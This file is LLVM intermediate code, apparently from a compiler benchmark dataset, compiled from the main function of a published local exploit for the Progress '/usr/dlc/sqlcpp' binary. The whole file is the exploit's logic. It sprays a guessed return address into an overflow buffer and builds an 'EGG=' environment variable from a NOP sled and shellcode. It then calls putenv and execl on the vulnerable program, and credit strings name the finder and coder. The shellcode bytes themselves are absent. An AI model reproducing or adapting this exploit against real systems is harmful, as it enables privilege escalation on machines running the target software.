; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_21359.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_21359.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [40 x i8] c"unable to allocate memory for %d bytes\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"/usr/dlc/bin/sqlcpp\0A\00", align 1
@.str.2 = private unnamed_addr constant [52 x i8] c"Vulnerability found by KF / http://www.snosoft.com\0A\00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"Coded by The Itch / http://www.promisc.org\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"Using return address: 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [26 x i8] c"Using buffersize    : %d\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"/usr/dlc/sqlcpp\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"sqlcpp\00", align 1
@get_sp = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %16, i32* %12, align 4
  %17 = ptrtoint i32* %14 to i32
  store i32 %17, i32* %14, align 4
  %18 = load i32, i32* %4, align 4
  %19 = icmp sgt i32 %18, 1
  br i1 %19, label %20, label %25

20:                                               ; preds = %2
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 1
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 @atoi(i8* %23)
  store i32 %24, i32* %11, align 4
  br label %25

25:                                               ; preds = %20, %2
  %26 = load i32, i32* %11, align 4
  %27 = call i8* @malloc(i32 %26)
  store i8* %27, i8** %6, align 8
  %28 = icmp ne i8* %27, null
  br i1 %28, label %33, label %29

29:                                               ; preds = %25
  %30 = load i32, i32* %11, align 4
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i32 %30)
  %32 = call i32 @exit(i32 1) #3
  unreachable

33:                                               ; preds = %25
  %34 = load i32, i32* %12, align 4
  %35 = call i8* @malloc(i32 %34)
  store i8* %35, i8** %7, align 8
  %36 = icmp ne i8* %35, null
  br i1 %36, label %41, label %37

37:                                               ; preds = %33
  %38 = load i32, i32* %12, align 4
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i64 0, i64 0), i32 %38)
  %40 = call i32 @exit(i32 1) #3
  unreachable

41:                                               ; preds = %33
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.2, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0))
  %45 = load i32, i32* %14, align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0), i32 %45)
  %47 = load i32, i32* %11, align 4
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i32 %47)
  %49 = load i8*, i8** %6, align 8
  store i8* %49, i8** %8, align 8
  %50 = load i8*, i8** %8, align 8
  %51 = bitcast i8* %50 to i64*
  store i64* %51, i64** %9, align 8
  store i32 0, i32* %13, align 4
  br label %52

52:                                               ; preds = %61, %41
  %53 = load i32, i32* %13, align 4
  %54 = load i32, i32* %11, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %64

56:                                               ; preds = %52
  %57 = load i32, i32* %14, align 4
  %58 = sext i32 %57 to i64
  %59 = load i64*, i64** %9, align 8
  %60 = getelementptr inbounds i64, i64* %59, i32 1
  store i64* %60, i64** %9, align 8
  store i64 %58, i64* %59, align 8
  br label %61

61:                                               ; preds = %56
  %62 = load i32, i32* %13, align 4
  %63 = add nsw i32 %62, 4
  store i32 %63, i32* %13, align 4
  br label %52

64:                                               ; preds = %52
  %65 = load i8*, i8** %7, align 8
  store i8* %65, i8** %8, align 8
  store i32 0, i32* %13, align 4
  br label %66

66:                                               ; preds = %79, %64
  %67 = load i32, i32* %13, align 4
  %68 = load i32, i32* %12, align 4
  %69 = load i32*, i32** @shellcode, align 8
  %70 = call i32 @strlen(i32* %69)
  %71 = sub nsw i32 %68, %70
  %72 = sub nsw i32 %71, 1
  %73 = icmp slt i32 %67, %72
  br i1 %73, label %74, label %82

74:                                               ; preds = %66
  %75 = load i32, i32* @NOP, align 4
  %76 = trunc i32 %75 to i8
  %77 = load i8*, i8** %8, align 8
  %78 = getelementptr inbounds i8, i8* %77, i32 1
  store i8* %78, i8** %8, align 8
  store i8 %76, i8* %77, align 1
  br label %79

79:                                               ; preds = %74
  %80 = load i32, i32* %13, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %13, align 4
  br label %66

82:                                               ; preds = %66
  store i32 0, i32* %13, align 4
  br label %83

83:                                               ; preds = %97, %82
  %84 = load i32, i32* %13, align 4
  %85 = load i32*, i32** @shellcode, align 8
  %86 = call i32 @strlen(i32* %85)
  %87 = icmp slt i32 %84, %86
  br i1 %87, label %88, label %100

88:                                               ; preds = %83
  %89 = load i32*, i32** @shellcode, align 8
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i32, i32* %89, i64 %91
  %93 = load i32, i32* %92, align 4
  %94 = trunc i32 %93 to i8
  %95 = load i8*, i8** %8, align 8
  %96 = getelementptr inbounds i8, i8* %95, i32 1
  store i8* %96, i8** %8, align 8
  store i8 %94, i8* %95, align 1
  br label %97

97:                                               ; preds = %88
  %98 = load i32, i32* %13, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %13, align 4
  br label %83

100:                                              ; preds = %83
  %101 = load i8*, i8** %7, align 8
  %102 = load i32, i32* %12, align 4
  %103 = sub nsw i32 %102, 1
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %101, i64 %104
  store i8 0, i8* %105, align 1
  %106 = load i8*, i8** %7, align 8
  %107 = call i32 @memcpy(i8* %106, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i32 4)
  %108 = load i8*, i8** %7, align 8
  %109 = call i32 @putenv(i8* %108)
  %110 = load i8*, i8** %6, align 8
  %111 = call i32 @execl(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0), i8* %110, i32 0)
  ret i32 0
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
